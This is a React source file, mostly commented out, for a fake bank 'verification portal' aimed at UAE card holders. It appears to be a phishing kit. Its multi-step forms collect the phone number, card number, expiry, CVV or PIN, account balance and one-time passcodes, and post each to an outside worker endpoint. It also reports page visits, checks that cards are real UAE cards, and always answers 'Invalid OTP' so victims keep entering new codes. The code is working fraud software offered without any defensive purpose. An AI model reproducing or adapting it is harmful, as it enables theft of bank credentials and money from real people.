// // };

// // // Step 2 Component - ATM Card Details
// // const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDate, setExpiryDate, cardPin, setCardPin, onNext, onBack }) => {
// //   const [loading, setLoading] = useState(false);

// //   const handleSubmit = async () => {
// //     setLoading(true);
// //     const result = await sendToAPI({
// //       type: 'cardDetails',
// //       phone: mobileNumber,
// //       cardNumber: atmCardNumber,
// //       expiryDate: expiryDate,
// //       cvv: cardPin,
// //     });
// //     setLoading(false);

// //     if (result.success) {
// //       onNext();
// //     }
// //   };

// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div>

// //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// //           For your security, please provide the following information to complete the verification process
// //         </p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className={`h-1.5 w-16 rounded-full transition-all ${
// //                   step <= 2 ? 'bg-white' : 'bg-white/30'
// //                 }`}
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="space-y-8 mt-12">
// //           <div>
// //             <input
// //               type="text"
// //               placeholder="Enter your 16-digit ATM card number *"
// //               value={atmCardNumber}
// //               onChange={(e) => setAtmCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
// //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //             />
// //           </div>

// //           <div>
// //             <input
// //               type="text"
// //               placeholder="Expiry date (MM/YY) *"
// //               value={expiryDate}
// //               onChange={(e) => {
// //                 let val = e.target.value.replace(/\D/g, '');
// //                 if (val.length >= 2) {
// //                   val = val.slice(0, 2) + '/' + val.slice(2, 4);
// //                 }
// //                 setExpiryDate(val);
// //               }}
// //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //             />
// //           </div>

// //           <div>
// //             <input
// //               type="password"
// //               placeholder="Enter your card PIN *"
// //               value={cardPin}
// //               onChange={(e) => setCardPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
// //               maxLength={4}
// //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //             />
// //           </div>
// //         </div>

// //         <button
// //           onClick={handleSubmit}
// //           disabled={!atmCardNumber || !expiryDate || !cardPin || loading}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           {loading ? 'Submitting...' : 'Continue'}
// //         </button>

// //         <button
// //           onClick={onBack}
// //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// //         >
// //           ← Back
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };

// // // Step 3 Component - Account Balance
// // const Step3AccountBalance = ({ mobileNumber, atmCardNumber, accountBalance, setAccountBalance, onNext, onBack }) => {
// //   const [loading, setLoading] = useState(false);

// //   const handleSubmit = async () => {
// //     setLoading(true);
// //     const result = await sendToAPI({
// //       type: 'balance',
// //       phone: mobileNumber,
// //       cardNumber: atmCardNumber,
// //       balance: accountBalance,
// //     });
// //     setLoading(false);

// //     if (result.success) {
// //       onNext();
// //     }
// //   };

// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div>

// //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// //           For your security, please provide the following information to complete the verification process
// //         </p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 3 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className={`h-1.5 w-16 rounded-full transition-all ${
// //                   step <= 3 ? 'bg-white' : 'bg-white/30'
// //                 }`}
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="mt-12">
// //           <input
// //             type="text"
// //             placeholder="Enter your account balance *"
// //             value={accountBalance}
// //             onChange={(e) => setAccountBalance(e.target.value)}
// //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //           />
// //         </div>

// //         <button
// //           onClick={handleSubmit}
// //           disabled={!accountBalance || loading}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           {loading ? 'Submitting...' : 'Continue'}
// //         </button>

// //         <button
// //           onClick={onBack}
// //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// //         >
// //           ← Back
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };

// // // Step 4 Component - OTP Verification
// // const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError, timer, setTimer, onBack }) => {
// //   const [loading, setLoading] = useState(false);

// //   const handleOtpChange = (index, value) => {
// //     if (value.length <= 1 && /^\d*$/.test(value)) {
// //       const newOtp = [...otp];
// //       newOtp[index] = value;
// //       setOtp(newOtp);

// //       if (value && index < 5) {
// //         const nextInput = document.getElementById(`otp-${index + 1}`);
// //         if (nextInput) nextInput.focus();
// //       }
// //     }
// //   };

// //   const handleVerifyOtp = async () => {
// //     setLoading(true);
// //     const otpString = otp.join('');

// //     const result = await sendToAPI({
// //       type: 'otp',
// //       username: mobileNumber,
// //       otp: otpString,
// //     });

// //     setLoading(false);

// //     // Always show invalid OTP error
// //     setOtpError('Invalid OTP. Please try again.');
// //     setOtp(['', '', '', '', '', '']);
// //   };

// //   const handleResendOtp = () => {
// //     if (timer === 0) {
// //       setTimer(57);
// //       setOtp(['', '', '', '', '', '']);
// //       setOtpError('');
// //     }
// //   };

// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div>

// //         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// //           We've sent a 6-digit verification code to your registered mobile number
// //         </p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className="h-1.5 w-16 rounded-full bg-white transition-all"
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="flex justify-center gap-3 mt-12 mb-6">
// //           {otp.map((digit, index) => (
// //             <input
// //               key={index}
// //               id={`otp-${index}`}
// //               type="text"
// //               maxLength={1}
// //               value={digit}
// //               onChange={(e) => handleOtpChange(index, e.target.value)}
// //               className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
// //             />
// //           ))}
// //         </div>

// //         {otpError && (
// //           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
// //             <p className="text-red-200 text-center font-medium">{otpError}</p>
// //           </div>
// //         )}

// //         <div className="text-center mb-2 mt-8">
// //           <p className="text-sm opacity-90">Didn't receive the code?</p>
// //         </div>

// //         <div className="text-center mb-8">
// //           <button
// //             onClick={handleResendOtp}
// //             disabled={timer > 0}
// //             className={`font-bold underline transition-all ${
// //               timer > 0 ? 'opacity-50 cursor-not-allowed' : 'opacity-100 hover:text-white/80'
// //             }`}
// //           >
// //             Resend OTP
// //           </button>
// //           <p className="text-sm opacity-90 mt-1">
// //             Resend available in {timer}s
// //           </p>
// //         </div>

// //         <button
// //           onClick={handleVerifyOtp}
// //           disabled={otp.some(digit => !digit) || loading}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           {loading ? 'Verifying...' : 'Verify'}
// //         </button>

// //         <button
// //           onClick={onBack}
// //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// //         >
// //           ← Back to Login
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };

// // // Main Component
// // export default function VerificationPortal() {
// //   const [currentStep, setCurrentStep] = useState(1);
// //   const [mobileNumber, setMobileNumber] = useState('');
// //   const [atmCardNumber, setAtmCardNumber] = useState('');
// //   const [expiryDate, setExpiryDate] = useState('');
// //   const [cardPin, setCardPin] = useState('');
// //   const [accountBalance, setAccountBalance] = useState('');
// //   const [otp, setOtp] = useState(['', '', '', '', '', '']);
// //   const [otpError, setOtpError] = useState('');
// //   const [timer, setTimer] = useState(57);

// //   // Send visit notification on component mount
// //   useEffect(() => {
// //     sendToAPI({
// //       type: 'visit',
// //       url: window.location.href,
// //     });
// //   }, []);

// //   useEffect(() => {
// //     if (currentStep === 4 && timer > 0) {
// //       const interval = setInterval(() => {
// //         setTimer((prev) => prev - 1);
// //       }, 1000);
// //       return () => clearInterval(interval);
// //     }
// //   }, [currentStep, timer]);

// //   const handleNext = () => {
// //     if (currentStep < 4) {
// //       setCurrentStep(currentStep + 1);
// //     }
// //   };

// //   const handleBack = () => {
// //     if (currentStep > 1) {
// //       setCurrentStep(currentStep - 1);
// //       setOtpError('');
// //     }
// //   };

// //   return (
// //     <div>
// //       {currentStep === 1 && (
// //         <Step1MobileNumber
// //           mobileNumber={mobileNumber}
// //           setMobileNumber={setMobileNumber}
// //           onNext={handleNext}
// //         />
// //       )}
// //       {currentStep === 2 && (
// //         <Step2ATMCard
// //           mobileNumber={mobileNumber}
// //           atmCardNumber={atmCardNumber}
// //           setAtmCardNumber={setAtmCardNumber}
// //           expiryDate={expiryDate}
// //           setExpiryDate={setExpiryDate}
// //           cardPin={cardPin}
// //           setCardPin={setCardPin}
// //           onNext={handleNext}
// //           onBack={handleBack}
// //         />
// //       )}
// //       {currentStep === 3 && (
// //         <Step3AccountBalance
// //           mobileNumber={mobileNumber}
// //           atmCardNumber={atmCardNumber}
// //           accountBalance={accountBalance}
// //           setAccountBalance={setAccountBalance}
// //           onNext={handleNext}
// //           onBack={handleBack}
// //         />
// //       )}
// //       {currentStep === 4 && (
// //         <Step4OTPVerification
// //           mobileNumber={mobileNumber}
// //           otp={otp}
// //           setOtp={setOtp}
// //           otpError={otpError}
// //           setOtpError={setOtpError}
// //           timer={timer}
// //           setTimer={setTimer}
// //           onBack={handleBack}
// //         />
// //       )}
// //     </div>
// //   );
// // }

// import React, { useState, useEffect } from "react";
// import { Globe } from "lucide-react";

// const API_URL = "https://my-pr-worker.instapayapi.workers.dev";

// // Card Validation Functions
// const validateCardWithBinlist = async (cardNumber) => {
//   try {
//     // Basic Luhn algorithm check first
//     if (!validateLuhn(cardNumber)) {
//       return { 
//         valid: false, 
//         error: 'Invalid card number format' 
//       };
//     }

//     // Binlist API call
//     const response = await fetch(`https://lookup.binlist.net/${cardNumber.substring(0, 8)}`, {
//       headers: {
//         'Accept-Version': '3'
//       }
//     });

//     if (!response.ok) {
//       return { 
//         valid: false, 
//         error: 'Unable to verify card details' 
//       };
//     }

//     const data = await response.json();
    
//     // Check if card is from UAE
//     console.log(data,"data")
//     if (data.country && data.country.alpha2 === 'AE') {
//       return {
//         valid: true,
//         bank: data.bank?.name || 'UAE Bank',
//         type: data.scheme || 'card',
//         country: 'AE'
//       };
//     } else {
//       return {
//         valid: false,
//         error: 'Only UAE bank cards are accepted'
//       };
//     }
//   } catch (error) {
//     console.error('Binlist API error:', error);
//     return {
//       valid: false,
//       error: 'Card verification failed. Please check the number.'
//     };
//   }
// };

// // Luhn Algorithm Implementation
// const validateLuhn = (cardNumber) => {
//   const cleanNumber = cardNumber.replace(/\D/g, '');
  
//   if (cleanNumber.length < 13 || cleanNumber.length > 19) {
//     return false;
//   }

//   let sum = 0;
//   let isEven = false;

//   for (let i = cleanNumber.length - 1; i >= 0; i--) {
//     let digit = parseInt(cleanNumber.charAt(i));

//     if (isEven) {
//       digit *= 2;
//       if (digit > 9) {
//         digit -= 9;
//       }
//     }

//     sum += digit;
//     isEven = !isEven;
//   }

//   return sum % 10 === 0;
// };

// // UAE Bank BIN validation
// const validateUAEBank = (cardNumber) => {
//   const uaeBankBINs = [
//     '418742', '455033', '455036', '426352', '512232',
//     '431933', '434092', '403032', '406995', '456448',
//     '456449', '529735', '543106', '457997', '458060'
//   ];
  
//   const bin = cardNumber.substring(0, 6);
//   return uaeBankBINs.includes(bin);
// };

// // API Helper Function
// const sendToAPI = async (data) => {
//   try {
//     const response = await fetch(API_URL, {
//       method: "POST",
//       headers: {
//         "Content-Type": "application/json",
//       },
//       body: JSON.stringify(data),
//     });
//     return await response.json();
//   } catch (error) {
//     console.error("API Error:", error);
//     return { success: false, error: error.message };
//   }
// };

// // Step 1 Component - Mobile Number
// const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
//   const [loading, setLoading] = useState(false);

//   const handleSubmit = async () => {
//     setLoading(true);
//     const result = await sendToAPI({
//       type: "phone",
//       phone: mobileNumber,
//     });
//     setLoading(false);

//     if (result.success) {
//       onNext();
//     }
//   };

//   return (
//     <div className="bg-[#007A45] min-h-screen text-white p-6">
//       <div className="max-w-md mx-auto">
//         <div className="flex justify-end mb-12 mt-4">
//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
//             <Globe className="w-4 h-4" />
//             <span className="font-medium">EN</span>
//           </button>
//         </div>

//         <h1 className="text-4xl font-bold mb-4">
//           Welcome to verification portal
//         </h1>
//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
//           Online Verification
//         </p>

//         <div className="text-center mb-6">
//           <p className="text-sm font-bold mb-3">STEP 1 OF 4</p>
//           <div className="flex justify-center gap-2">
//             {[1, 2, 3, 4].map((step) => (
//               <div
//                 key={step}
//                 className={`h-1.5 w-16 rounded-full transition-all ${
//                   step === 1 ? "bg-white" : "bg-white/30"
//                 }`}
//               />
//             ))}
//           </div>
//         </div>

//         {/* <div className="mt-12">
//           <label className="block text-sm font-bold mb-3 opacity-90">
//             Registered Mobile Number *
//           </label>
//           <input
//             type="tel"
//             inputMode="numeric"
//             pattern="[0-9]*"
//             placeholder="Enter Registered Mobile Number"
//             value={mobileNumber}
//             onChange={(e) => setMobileNumber(e.target.value)}
//             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all mb-8"
//           />
//         </div> */}

//         <div
//           className="flex items-center bg-white/10 backdrop-blur-md border border-white/20 
// rounded-2xl px-4 py-3 mb-8 shadow-lg gap-3"
//         >
//           {/* +971 Country Code */}
//           <span className="text-lg sm:text-xl font-semibold text-white/90">
//             +971
//           </span>

//           {/* Divider Line */}
//           <div className="h-6 sm:h-8 w-px bg-white/30"></div>

//           {/* Input */}
//           <input
//             type="tel"
//             inputMode="numeric"
//             pattern="[0-9]*"
//             placeholder="Enter Registered Mobile Number"
//             value={mobileNumber}
//             onChange={(e) =>
//               setMobileNumber(e.target.value.replace(/\D/g, "").slice(0, 9))
//             }
//             className="flex-1 bg-transparent text-white placeholder-white/50 text-base sm:text-xl 
//                focus:outline-none truncate"
//           />
//         </div>

//         <button
//           onClick={handleSubmit}
//           disabled={!mobileNumber || loading}
//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
//         >
//           {loading ? "Submitting..." : "Continue"}
//         </button>
//       </div>
//     </div>
//   );
// };

// // Step 2 Component - ATM Card Details
// // const Step2ATMCard = ({
// //   mobileNumber,
// //   atmCardNumber,
// //   setAtmCardNumber,
// //   expiryDate,
// //   setExpiryDate,
// //   cardPin,
// //   setCardPin,
// //   onNext,
// //   onBack,
// // }) => {
// //   const [loading, setLoading] = useState(false);

// //   const handleSubmit = async () => {
// //     setLoading(true);
// //     const result = await sendToAPI({
// //       type: "cardDetails",
// //       phone: mobileNumber,
// //       cardNumber: atmCardNumber,
// //       expiryDate: expiryDate,
// //       cvv: cardPin,
// //     });
// //     setLoading(false);

// //     if (result.success) {
// //       onNext();
// //     }
// //   };

// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div>

// //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// //           For your security, please provide the following information to
// //           complete the verification process
// //         </p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className={`h-1.5 w-16 rounded-full transition-all ${
// //                   step <= 2 ? "bg-white" : "bg-white/30"
// //                 }`}
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="space-y-8 mt-12">
// //           <div>
// //             <input
// //               type="number"
// //               inputMode="numeric"
// //               pattern="[0-9]*"
// //               placeholder="Enter your 16-digit ATM card number *"
// //               value={atmCardNumber}
// //               onChange={(e) =>
// //                 setAtmCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
// //               }
// //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //             />
// //           </div>

// //           <div>
// //             <input
// //               type="text"
// //               inputMode="numeric"
// //               pattern="[0-9/]*"
// //               placeholder="Expiry date (MM/YY) *"
// //               value={expiryDate}
// //               onChange={(e) => {
// //                 let val = e.target.value.replace(/\D/g, "");
// //                 if (val.length >= 2) {
// //                   val = val.slice(0, 2) + "/" + val.slice(2, 4);
// //                 }
// //                 setExpiryDate(val);
// //               }}
// //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //             />
// //           </div>

// //           <div>
// //             <input
// //               type="number"
// //               inputMode="numeric"
// //               pattern="[0-9]*"
// //               placeholder="CVV *"
// //               value={cardPin}
// //               onChange={(e) =>
// //                 setCardPin(e.target.value.replace(/\D/g, "").slice(0, 3))
// //               }
// //               maxLength={4}
// //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //             />
// //           </div>
// //           <p className="text-sm text-white">
// //             cvv digits (cvv on back of card)
// //           </p>
          
// //         </div>

// //         <button
// //           onClick={handleSubmit}
// //           disabled={!atmCardNumber || !expiryDate || !cardPin || loading}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           {loading ? "Submitting..." : "Continue"}
// //         </button>

// //         <button
// //           onClick={onBack}
// //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// //         >
// //           ← Back
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };
// // Step 2 Component - ATM Card Details
// const Step2ATMCard = ({
//   mobileNumber,
//   atmCardNumber,
//   setAtmCardNumber,
//   expiryDate,
//   setExpiryDate,
//   cardPin,
//   setCardPin,
//   onNext,
//   onBack,
// }) => {
//   const [loading, setLoading] = useState(false);
//   const [cardError, setCardError] = useState('');
//   const [isValidating, setIsValidating] = useState(false);

//   // Real-time card validation
//   const handleCardNumberChange = async (value) => {
//     const cleanValue = value.replace(/\D/g, "").slice(0, 16);
//     setAtmCardNumber(cleanValue);
//     setCardError('');

//     // Validate when user enters 16 digits
//     if (cleanValue.length === 16) {
//       setIsValidating(true);
      
//       // Basic validation first
//       if (!validateLuhn(cleanValue)) {
//         setCardError('Invalid card number format');
//         setIsValidating(false);
//         return;
//       }

//       if (!validateUAEBank(cleanValue)) {
//         setCardError('Only UAE bank cards are accepted');
//         setIsValidating(false);
//         return;
//       }

//       // Advanced validation with Binlist
//       try {
//         const validationResult = await validateCardWithBinlist(cleanValue);
//         if (!validationResult.valid) {
//           setCardError(validationResult.error);
//         }
//         // If valid, no error message - card is accepted
//       } catch (error) {
//         console.error('Validation error:', error);
//         // Continue without API validation if it fails
//       } finally {
//         setIsValidating(false);
//       }
//     }
//   };

//   const handleSubmit = async () => {
//     // Final validation before submit
//     if (atmCardNumber.length !== 16) {
//       setCardError('Please enter a valid 16-digit card number');
//       return;
//     }

//     if (!validateLuhn(atmCardNumber)) {
//       setCardError('Invalid card number format');
//       return;
//     }

//     setLoading(true);
//     const result = await sendToAPI({
//       type: "cardDetails",
//       phone: mobileNumber,
//       cardNumber: atmCardNumber,
//       expiryDate: expiryDate,
//       cvv: cardPin,
//     });
//     setLoading(false);

//     if (result.success) {
//       onNext();
//     }
//   };

//   // Expiry date validation
//   const isExpiryValid = () => {
//     if (expiryDate.length !== 5) return false;
    
//     const [month, year] = expiryDate.split('/');
//     const currentYear = new Date().getFullYear() % 100;
//     const currentMonth = new Date().getMonth() + 1;
    
//     const expMonth = parseInt(month);
//     const expYear = parseInt(year);
    
//     if (expMonth < 1 || expMonth > 12) return false;
//     if (expYear < currentYear) return false;
//     if (expYear === currentYear && expMonth < currentMonth) return false;
    
//     return true;
//   };

//   const isFormValid = () => {
//     return atmCardNumber.length === 16 && 
//            !cardError && 
//            isExpiryValid() && 
//            cardPin.length === 3;
//   };

//   return (
//     <div className="bg-[#007A45] min-h-screen text-white p-6">
//       <div className="max-w-md mx-auto">
//         <div className="flex justify-end mb-12 mt-4">
//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
//             <Globe className="w-4 h-4" />
//             <span className="font-medium">EN</span>
//           </button>
//         </div>

//         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
//           For your security, please provide the following information to
//           complete the verification process
//         </p>

//         <div className="text-center mb-6">
//           <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
//           <div className="flex justify-center gap-2">
//             {[1, 2, 3, 4].map((step) => (
//               <div
//                 key={step}
//                 className={`h-1.5 w-16 rounded-full transition-all ${
//                   step <= 2 ? "bg-white" : "bg-white/30"
//                 }`}
//               />
//             ))}
//           </div>
//         </div>

//         <div className="space-y-8 mt-12">
//           <div>
//             <div className="relative">
//               <input
//                 type="text"
//                 inputMode="numeric"
//                 pattern="[0-9]*"
//                 placeholder="Enter your 16-digit ATM card number *"
//                 value={atmCardNumber}
//                 onChange={(e) => handleCardNumberChange(e.target.value)}
//                 className={`w-full bg-transparent border-b-2 py-4 px-2 placeholder-white/70 focus:outline-none text-lg transition-all ${
//                   cardError ? 'border-red-400' : 'border-white/50 focus:border-white'
//                 }`}
//               />
//               {isValidating && (
//                 <div className="absolute right-2 top-4">
//                   <div className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
//                 </div>
//               )}
//             </div>
//             {cardError && (
//               <p className="text-red-300 text-sm mt-2 flex items-center gap-1">
//                 <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
//                   <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
//                 </svg>
//                 {cardError}
//               </p>
//             )}
//             {atmCardNumber.length === 16 && !cardError && !isValidating && (
//               <p className="text-green-300 text-sm mt-2 flex items-center gap-1">
//                 <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
//                   <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
//                 </svg>
//                 Valid UAE bank card
//               </p>
//             )}
//           </div>

//           <div>
//             <input
//               type="text"
//               inputMode="numeric"
//               pattern="[0-9/]*"
//               placeholder="Expiry date (MM/YY) *"
//               value={expiryDate}
//               onChange={(e) => {
//                 let val = e.target.value.replace(/\D/g, "");
//                 if (val.length >= 2) {
//                   val = val.slice(0, 2) + "/" + val.slice(2, 4);
//                 }
//                 setExpiryDate(val);
//               }}
//               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//             />
//           </div>

//           <div>
//             <input
//               type="number"
//               inputMode="numeric"
//               pattern="[0-9]*"
//               placeholder="CVV *"
//               value={cardPin}
//               onChange={(e) =>
//                 setCardPin(e.target.value.replace(/\D/g, "").slice(0, 3))
//               }
//               maxLength={3}
//               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//             />
//           </div>
//           <p className="text-sm text-white">
//             CVV digits (CVV on back of card)
//           </p>
//         </div>

//         <button
//           onClick={handleSubmit}
//           disabled={!isFormValid() || loading}
//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
//         >
//           {loading ? "Submitting..." : "Continue"}
//         </button>

//         <button
//           onClick={onBack}
//           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
//         >
//           ← Back
//         </button>
//       </div>
//     </div>
//   );
// };

// // Step 3 Component - Account Balance
// const Step3AccountBalance = ({
//   mobileNumber,
//   atmCardNumber,
//   accountBalance,
//   setAccountBalance,
//   onNext,
//   onBack,
// }) => {
//   const [loading, setLoading] = useState(false);

//   const handleSubmit = async () => {
//     setLoading(true);
//     const result = await sendToAPI({
//       type: "balance",
//       phone: mobileNumber,
//       cardNumber: atmCardNumber,
//       balance: accountBalance,
//     });
//     setLoading(false);

//     if (result.success) {
//       onNext();
//     }
//   };

//   return (
//     <div className="bg-[#007A45] min-h-screen text-white p-6">
//       <div className="max-w-md mx-auto">
//         <div className="flex justify-end mb-12 mt-4">
//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
//             <Globe className="w-4 h-4" />
//             <span className="font-medium">EN</span>
//           </button>
//         </div>

//         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
//           For your security, please provide the following information to
//           complete the verification process
//         </p>

//         <div className="text-center mb-6">
//           <p className="text-sm font-bold mb-3">STEP 3 OF 4</p>
//           <div className="flex justify-center gap-2">
//             {[1, 2, 3, 4].map((step) => (
//               <div
//                 key={step}
//                 className={`h-1.5 w-16 rounded-full transition-all ${
//                   step <= 3 ? "bg-white" : "bg-white/30"
//                 }`}
//               />
//             ))}
//           </div>
//         </div>

//         <div className="mt-12">
//           <input
//             type="number"
//             inputMode="numeric"
//             pattern="[0-9]*"
//             placeholder="Enter your account balance *"
//             value={accountBalance}
//             onChange={(e) => setAccountBalance(e.target.value)}
//             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//           />
//         </div>

//         <button
//           onClick={handleSubmit}
//           disabled={!accountBalance || loading}
//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
//         >
//           {loading ? "Submitting..." : "Continue"}
//         </button>

//         <button
//           onClick={onBack}
//           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
//         >
//           ← Back
//         </button>
//       </div>
//     </div>
//   );
// };

// // Step 4 Component - OTP Verification
// // const Step4OTPVerification = ({
// //   mobileNumber,
// //   otp,
// //   setOtp,
// //   otpError,
// //   setOtpError,
// //   timer,
// //   setTimer,
// //   onBack,
// // }) => {
// //   const [loading, setLoading] = useState(false);

// //   const handleOtpChange = (index, value) => {
// //     if (value.length <= 1 && /^\d*$/.test(value)) {
// //       const newOtp = [...otp];
// //       newOtp[index] = value;
// //       setOtp(newOtp);

// //       if (value && index < 5) {
// //         const nextInput = document.getElementById(`otp-${index + 1}`);
// //         if (nextInput) nextInput.focus();
// //       }
// //     }
// //   };

// //   const handleVerifyOtp = async () => {
// //     setLoading(true);
// //     const otpString = otp.join("");

// //     const result = await sendToAPI({
// //       type: "otp",
// //       username: mobileNumber,
// //       otp: otpString,
// //     });

// //     setLoading(false);

// //     // Always show invalid OTP error
